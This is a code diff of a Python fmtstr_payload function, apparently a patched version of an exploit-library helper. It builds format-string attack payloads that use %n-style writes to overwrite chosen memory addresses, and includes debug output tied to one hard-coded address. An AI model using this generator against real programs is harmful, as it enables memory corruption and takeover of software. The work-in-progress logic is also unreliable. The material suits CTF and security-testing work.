@@ -37,37 +37,54 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
         # So we have to consider the overflow kinda thing.
         write_value_limit = (1 << (decalage - 1)) - 1 if mask != 0xff else 0xff
         value = what & mask
+        left_value = what >> decalage
         this_where = where
         this_writes = {}
-        while value:
+        while left_value:
             if value >= write_value_limit:
                 values = _split_write(value, this_where, mask >> 8, decalage >> 1, step >> 1)
                 this_writes.update(values)
             else:
-                this_writes[this_where] = value
+                this_writes[this_where] = (value, step)
             what >>= decalage
             value = what & mask
+            left_value = what
             this_where += step
-            print("value {}".format(value))
         print(this_writes)
         return this_writes
 
     splitted_writes = {}
     print(writes.items())
     for where, what in writes.items():
+        if where == 0x6cb308:
+            print("splitting:" + str(_split_write(what, where, mask, decalage, step)))
         splitted_writes.update(_split_write(what, where, mask, decalage, step))
     print("splitted writes")
-    print(splitted_writes)
+    for where, what in splitted_writes.items():
+        print(hex(where), hex(what[0]), hex(what[1]))
+
+    def _get_formatz(size):
+        if size == 1:
+            return 'hh'
+        elif size == 2:
+            return 'h'
+        elif size == 4:
+            return ''
+        else:
+            raise Exception("internal error, write size wrong")
 
     payload = ""
     blank_chars = 0
     write_addr_seq = []
-    print(sorted(splitted_writes.items(), key=operator.itemgetter(1)))
-    for where, what in sorted(splitted_writes.items(), key=operator.itemgetter(1)):
+    #print(sorted(splitted_writes.items(), key=operator.itemgetter(1)))
+    for where, what_thing in sorted(splitted_writes.items(), key=lambda x: x[1][0]):
+        what = what_thing[0]
+        what_size = what_thing[1]
         need_write_chars = what - numbwritten
         if need_write_chars:
             payload += "%{}c".format(need_write_chars)
 
+        formatz = _get_formatz(what_size)
         payload += "%{}$" + formatz + "n"
         numbwritten += need_write_chars
         blank_chars += 2
@@ -78,12 +95,10 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
 
     buf_written = len(payload)
     addr_size = 8 if context.bits == 64 else 4
-    print("buf written {}".format(buf_written))
     filled_len = ((buf_written - 1) & ~(addr_size - 1)) + addr_size
 
     ok = False
     now_filled_len = filled_len
-    print("filled len {}".format(filled_len))
     while not ok:
         real_index_in_chars = 0
         index_start = offset + (now_filled_len / addr_size)
